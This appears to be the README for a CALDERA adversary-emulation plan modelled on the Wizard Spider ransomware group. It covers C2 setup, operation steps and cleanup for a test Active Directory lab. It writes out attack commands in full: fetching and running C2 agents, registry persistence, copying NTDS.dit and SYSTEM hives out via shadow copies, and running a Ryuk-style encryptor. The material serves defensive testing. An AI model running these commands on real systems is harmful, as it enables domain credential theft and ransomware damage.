# DEPENDENCIES

## CALDERA C2 Server
- Linux/Mac OS, 64-bit
- git commandline installed
- python3.7+ with pip3
    - python3.9+ recommended
- golang 1.17+
    - required for dynamic agent compilation

## Attacker Machine Dependencies
- Linux OS, 64-bit
    - Kali recommended
    - Can be the same machine as the CALDERA C2 server if needed.
- command-line tools
    - xfreerdp
    - xdotool
    - smbclient

## Target Machine Dependencies
- On the initial target, Outlook will be used for certain TTPs. Thus, a valid Outlook license will be required, and the initial target machine should have the user already open and log into Outlook prior to executing this scenario.

# SETUP

## Download and Install CALDERA
Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server.
```
git clone --depth 1 https://github.com/mitre/caldera.git --recursive
cd caldera
git checkout master && git pull
cp conf/default.yml conf/local.yml
```

Add the `emu` plugin add emu to your `conf/local.yml` configuration file. Feel free to enable or disable other plugins
by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.
```
vi conf/local.yml
```

Download pip dependencies.
```
pip3 install --upgrade setuptools
pip3 install --upgrade pip
pip3 install -r requirements.txt
```

Run your C2 server.
```
python3 server.py --log DEBUG
```

# RUNNING THE OPERATION

## Launch Agent on Attacker-controlled Kali Machine
We recommend using a different Kali linux machine to run the Kali agent since RDP windows will need to be in the forefront when performing certain automated keystrokes. Thus, in order to avoid disrupting automated RDP keystrokes, it's best to run the Kali agent on a machine different from the C2 server. If you plan on using the same Kali machine to run the C2 server and the kali agent, make sure not to type or click around when performing RDP-related abilities.

Launch the agent by running the following command on the (preferably remote) Kali machine:
```
server="http://192.168.0.4:8888"; # change IP address for your CALDERA C2 server according to your environment
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "server:$server" -H "group:kali" $server/file/download > sandcat.go;
chmod +x sandcat.go;
./sandcat.go -v;
```

Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is `red`, default password is `admin`).

Make sure you can see your kali agent after clicking the `agents` option on the menu on the left, under "Campaigns".

For best results, make sure you don't have other agents currently beaconing in.

## Fact Setup
Before running the operation, you will need to make sure that the Wizard Spider fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under `Configuration`, select `fact sources`. Under the "Select a source" drop-down menu, select `Wizard Spider (Emu)`, which is the fact source for the Wizard Spider adversary. From there, update the following facts as needed:
- `ad.domain.name`: this is the short-hand domain name (not the fully-qualified domain) for your Active Directory environment. For instance, if your usernames look like `DOMAINNAME\Username`, then you will want your fact value to be `DOMAINNAME`.
- `ad.domain.full_name`: this will be the fully qualified domain name (e.g. `oz.local`) for your Active Directory environment.
- `initial.target.host`: the IPv4 address or hostname of the initial target for the operation. This will have to be a Windows machine connected to your Active Directory environment.
- `initial.user.name`: the username (without the domain portion) that will be used to log into the initial target.
- `initial.user.password`: the password of the initial user.
- `second.target.host`: the IPv4 address or hostname of the second target for the operation. This will have to be a Windows machine connected to your Active Directory environment.
- `second_host.user.name`: the username (without the domain portion) that will be used to log into the second target.
- `second_host.user.password`: the password of the second target user.
- `dc.target.host`: the IPv4 address or hostname of the Domain Controller for your AD environment.
- `domain.admin.name`: username (without the domain portion) of the domain admin.
- `domain.admin.password`: domain admin's password.

## Operation Setup
After adjusting the fact source as needed, select `operations` from the left menu, under "Campaigns".

Select "+ Create Operation" to the right of the drop-down menu.

Add in an appropriate name for your operation.

For the adversary profile, select `Wizard Spider`.

For the Fact Source, select `Wizard Spider (Emu)`.

Select `Advanced` to expand the Advanced configurations.

For `Group`, make sure `All Groups` is selected.

For the Planner, select `Wizard Spider Planner`.

Make sure the `plain-text` obfuscator is selected.

For Autonomous, make sure "Run Autonomously" is selected.

For the Parser, select "Do not user default parsers".

For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.

For Run state, make sure "Run immediately" is selected.

Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.

Keep visibility at 51.

When ready, hit the Start button and wait for your operation to complete.

# TERMINATING THE OPERATION
Press the stop button in the operation GUI to finish the operation and enter the cleanup stage.

## Cleanup
- terminate agents from the GUI, or RDP into the 3 target machines to stop the agent processes
- RDP into first lat movement target and remove `%AppData%\uxtheme.exe`
- from the Kali agent's directory, remove the `ws_tools` directory after extracting exfiltrated files.
- Run cleanup scripts from https://github.com/attackevals/wizard_spider/tree/public_release/Resources/cleanup on the corresponding hosts
to cover any automated cleanup actions that failed and to handle cleanup actions that aren't included in the CALDERA abilities.

# MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN

- When performing RDP connections with shared drives, some of the local file paths on the attacker machine are adjusted for more flexibility, since agents may be started from various directories on the local file system. The overall functionality remains the same.
- Note that when the operation terminates, the agents running on the various targets will perform various cleanup tasks in order to revert
certain changes, such as file downloads and registry writes. These are not part of the actual evaluation. The following cleanup actions are taken:
    - The agent running on the attacker-controlled Kali machine will delete the compiled agent binaries `ChristmasCard.exe` and `TrickBotClientExe.exe` in its local directory.
    - The agent running on the initial target will remove the registry key persistence via: `reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /f`
    - The agent running on the initial target will delete the downloaded Outlook scraper DLL file at `C:\Windows\SysWOW64\Outlook.dll`.
    - The agent running on the first lateral movement target will delete the `discovery.txt` file generated during step 5.
    - The agent running on the domain controller will undo the registry persistence via the powershell command: `Remove-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" -Force`
    - The agent running on the domain controller will unmount the `Z:` drive and will remove the following downloaded files if they still exist on the file system:
        - `C:\Users\Public\kill.bat`
        - `C:\Users\Public\window.bat`
        - `C:\Users\Public\ryuk.exe`

## Step 1
- Initial access will be performed by running a CALDERA agent executable (.exe file) rather than a malicious word document with VBA macros.
    - The agent will act as the remote access implant and will replace the Emotet-based agent from evals.
    - The agent is a compiled .exe written in Golang, whereas the original evals agent was run via a DLL.
- The agent executable will be uploaded to the initial target using `smbclient` at the user's desktop, similar to what was done with the original `.docm` file.
- To emulate user execution of the file, an agent running on an attacker-controlled machine will run `xfreerdp` to connect to
the initial target. `xdotool` will be used to send automated keystrokes to open the uploaded file via explorer.exe start menu, rather than double clicking it from the desktop.
    - Note that the agent executable will directly connect to the C2 server and does not act as a stager. No VBS script or DLL will be downloaded or executed as part of this process.
    - Note that since a malicious word document is not being used, winword.exe will not be executed. Rather, the agent executable will be executed directly.
- Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the `ssl` plugin and is listening on an HTTPS socket.
- Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (default 8888), and so the port numbers may differ from what was used in evals.

## Step 2
- Instead of using the `RegSetValueExA` WinAPI function, the CALDERA agent will run `reg.exe` via cmd to perform the registry write.
    - Command: `reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /t REG_SZ /d "%userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL"`

## Step 3
- Instead of performing API calls for System Information Discovery and Process Discovery, the agent will execute the following processes:
    - `systeminfo.exe` is executed instead of the API calls `RtlGetVersion`, `GetNativeSystemInfo`, and `RtlGetNtProductType`
    - `tasklist.exe` is executed instead of the API call `CreateToolhelp32Snapshot`
- Outlook scraper DLL download modifications
    - The file will be initially be written to disk at the agent's current working directory as `OutlookScraper.dll` and then moved to `C:\Windows\SysWOW64\Outlook.dll` via cmd.
    - Due to CALDERA's C2 infrastructure, the URL endpoint for the file download will be `/file/download` rather than `/modules`
    - The HTTP request will be performed via HTTP POST rather than HTTP GET
    - The HTTP request will include extra HTTP headers specifying the file name `file:OutlookScraper.dll` and agent operating system `platform:windows`, as well as the unique agent identifier
    - The agent uses GoLang's `net/http` library rather than WinHttp API calls
    - A different user agent string will be used
    - Download will be done over HTTP by default, unless CALDERA is configured to run over HTTPS using the `ssl` plugin.
- The CALDERA agent will not load the Outlook DLL in memory or call the DLL functions, but will instead directly run the PowerShell commands that the DLL functions would have run. The agent will call PowerShell directly rather than via cmd or by loading the DLL.


## Step 4
- Lateral movement will be performed by running a CALDERA agent executable (.exe file) rather than the actual TrickBotClientExe.exe used
in evals.
    - The agent will act as the remote access implant and will replace the TrickBot-based malware from evals.
- To emulate the ingress tool transfer of the file over RDP, an agent running on an attacker-controlled machine will run `xfreerdp` to connect to
the initial target. `xdotool` will be used to send automated keystrokes to open cmd.exe, copy the agent executable over the shared drive, and execute it from cmd.
- Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the `ssl` plugin and is listening on an HTTPS socket.
- Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (8888 by default), and so the port numbers may differ from what was used in evals.

## Step 5
- Instead of using the C standard library function `system()` to execute commands, the CALDERA agent will spawn a separate `cmd` process to run each command.

## Step 6
- Instead of using API calls, the agent will download rubeus.exe over the HTTP(S) C2 channel.
    - Due to CALDERA C2 infrastructure, the URL endpoint for the file download will be `/file/download` rather than `/camp1/...`
    - The HTTP request will be performed via HTTP POST rather than HTTP GET.
    - The HTTP request includes extra HTTP headers specifying the file name `file:rubeus.exe`, agent operation system `platform:windows`, and unique agent identifier.
    - Uses Golang's `net/http` library instead of `WinHttp` API calls
    - Due to predefined agent behavior, the `rubeus.exe` payload will be deleted automatically after the CALDERA agent performs this step.

## Step 7
- Lateral movement will be performed by running a CALDERA agent executable (.exe file) rather than the actual uxtheme.exe malware used
in evals.
    - The agent will act as the remote access implant and will replace the uxtheme.exe malware from evals.
- To emulate the ingress tool transfer of the file over RDP, an agent running on an attacker-controlled machine will run `xfreerdp` to connect to
the domain controller. `xdotool` will be used to send automated keystrokes over RDP to open an administrator PowerShell session, download a dynamically compiled agent executable from the CALDERA C2 server, and execute it via the PowerShell console.
    - Note that the PowerShell commands for the HTTP request were modified in the following ways:
        - Due to CALDERA's C2 infrastructure, the URL endpoint for the file download will be `/file/download` rather than `/getFile/uxtheme.exe`
        - The HTTP request will be performed via HTTP POST rather than HTTP GET
        - The HTTP request will include extra HTTP headers specifying the agent file name (`sandcat.go`), agent operating system (`windows`), and agent group (`wizard`)
        - the compiled agent binary will have a different hash but overall same functionality as previous agents
    - The new powershell commands to download and execute the binary look like the following:
```
$Body=@{file="sandcat.go";server="C2_SERVER_ADDRESS_AND_PORT";platform="windows";group="wizard"}
Invoke-WebRequest -Uri #{server}/file/download -OutFile $env:AppData\uxtheme.exe -Method POST -Headers $Body
& $env:AppData\uxtheme.exe
```
- While uxtheme.exe was not executed on the domain controller during the actual evaluation, the agent executable will be executed here to allow the remaining steps to be executed in an automated manner without having to send everything over automated RDP keystrokes.
- Agent-server communication will be in unencrypted by default unless CALDERA is run using the `ssl` plugin and is listening on an HTTPS socket.
- Note that the agent will connect to the C2 server using the pre-configured port from the CALDERA configuration file (8888 by default), and so the port numbers may differ from what was used in evals.
- The agent executable running on the domain controller will spawn a separate PowerShell process to perform registry persistence.
- The agent executable running on the domain controller will spawn a separate PowerShell process to execute adfind.

## Step 8
- The agent on the domain controller will spawn a separate PowerShell process to run the following via separate `cmd` process:
    - `cmd /c "vssadmin.exe create shadow /for=C:"`
- The shadow copy path will typically look like `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`, but the final number may differ depending
on the environment and if previous shadow copies have been created. To account for differing names, CALDERA will parse out the shadow copy path and save it for the upcoming exfiltration.
- The agent on the domain controller will spawn a separate PowerShell process to run the following via separate `cmd` processes:
    - `cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit"`
    - `cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE"`
    - Note that `#{vssadmin.shadow_copy.name}` represents the saved shadow copy path (e.g `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`)
- The agent on the domain controller will spawn a separate PowerShell process to run the following via separate `cmd` process:
    - `cmd /c "reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE"`

## Step 9
- The agent on the domain controller will spawn a separate PowerShell process to run the following via separate `cmd` processes:
    - `cmd /c "net use Z: \\#{second.target.host}\C$"`, where `#{second.target.host}` is the IP address or hostname of the first lateral movement target.
    - `cmd /c "copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat"`
- The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate `cmd` process:
    - `cmd /c "C:\Users\Public\kill.bat" 2> $null; exit 0;`
    - Due to the way CALDERA handles commands with error messages and non-0 exit codes, the above PowerShell command has to suppress error output and force exit with the successful (0) exit code.
- The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate `cmd` process:
    - `cmd /c "copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat"`
- The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate `cmd` process:
    - `cmd /c "C:\Users\Public\window.bat" 2> $null; exit 0;`
    - Due to the way CALDERA handles commands with error messages and non-0 exit codes, the above PowerShell command has to suppress error output and force exit with the successful (0) exit code.

## Step 10
- The agent on the domain controller will spawn a separate PowerShell process to run the following via a separate `cmd` process:
    - `cmd /c "copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe"`
- The agent on the domain controller will spawn a separate PowerShell process to do the following:
    - Start a background notepad process via: `Start-Process C:\Windows\System32\notepad.exe;`
    - Run ryuk.exe via separate cmd process: `cmd /c "C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe";`
